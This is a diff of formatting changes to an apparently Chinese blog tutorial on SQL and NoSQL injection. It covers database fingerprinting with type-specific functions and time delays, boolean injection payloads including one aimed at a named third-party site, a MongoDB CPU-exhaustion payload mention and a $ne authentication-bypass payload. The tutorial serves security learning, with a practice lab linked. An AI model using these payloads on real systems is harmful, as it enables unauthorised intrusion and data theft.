@@ -491,7 +491,9 @@
 <p>mysql数据库使用oracle脚本<code>select &#39;some&#39;||&#39;thing&#39;</code><br><img src="https://i.imgur.com/b21D4ZH.png" alt=""></p>
 <p>其它同理。</p>
 <p>2.法二</p>
-<p>可以利用数据库的一些特有的返回整型结果的函数来判断数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SQLServer	@@pack_received</span><br><span class="line">                @@rowcount</span><br><span class="line">MySQL	        connection_id()</span><br><span class="line">                last_insert_id()</span><br><span class="line">                row_count()</span><br><span class="line">Oracle	        BITAND(1,1)</span><br><span class="line">PostgreSQL	select extract(dow from now())</span><br></pre></td></tr></table></figure></p>
+<p>可以利用数据库的一些特有的返回整型结果的函数来判断数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SQLServer	@@pack_received</span><br><span class="line">                @@rowcount</span><br><span class="line">MySQL	        connection_id()</span><br><span class="line">                last_insert_id()</span><br><span class="line">                row_count()</span><br><span class="line">Oracle	        BITAND(1,1)</span><br><span class="line">PostgreSQL	select extract(dow from now())</span><br></pre></td></tr></table></figure>
+
 <p>同样是MySQL数据库 使用 select connection_id()<br><img src="https://i.imgur.com/kyp9GD0.png" alt=""><br>使用 select extract(dow from now())<br><img src="https://i.imgur.com/LjbXwyI.png" alt=""></p>
 <p>法三、<br>通过某些特有的函数判断，比如SQLServer的 waitfor delay 比如PostgreSQL的pg_sleep()<br> 基于时间的<br> 在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</p>
 <p>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</p>
@@ -503,7 +505,7 @@
 </li>
 </ul>
 <p><code>ID=1 and(select count(*) fromm sysobjects)&gt;0</code><br>返回异常</p>
-<p><del><em> SQLserver:<br>    `and (select count(</em>) from sysobjects) &gt;0 `<br>    返回正常说明是mssql</del><br>sqlserver：<br><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0</code></p>
+<p><del>* SQLserver:<br>    <code>and (select count(*) from sysobjects) &gt;0</code><br>    返回正常说明是mssql</del><br>sqlserver：<br><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0</code></p>
 <p>MySQL:<br>    <code>and length(user())&gt;0</code><br>    <code>id=2 CHAR(97,110,100,32,49,61,49)</code><br>    <code>id=2 and version() &gt;0</code></p>
 <p>返回正常说明是MySQL</p>
 <p>ORACLE：<br><code>ID=1 and &#39;1&#39; || &#39;1&#39; = &#39;11</code></p>
@@ -547,6 +549,7 @@
 </blockquote>
 <p>这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。<br>5.Node.js中的NoSQL注入<br>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>其实就是把它数据变成json。<br>靶场</p>
 <blockquote>
 <p><a href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035" target="_blank" rel="noopener">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p>
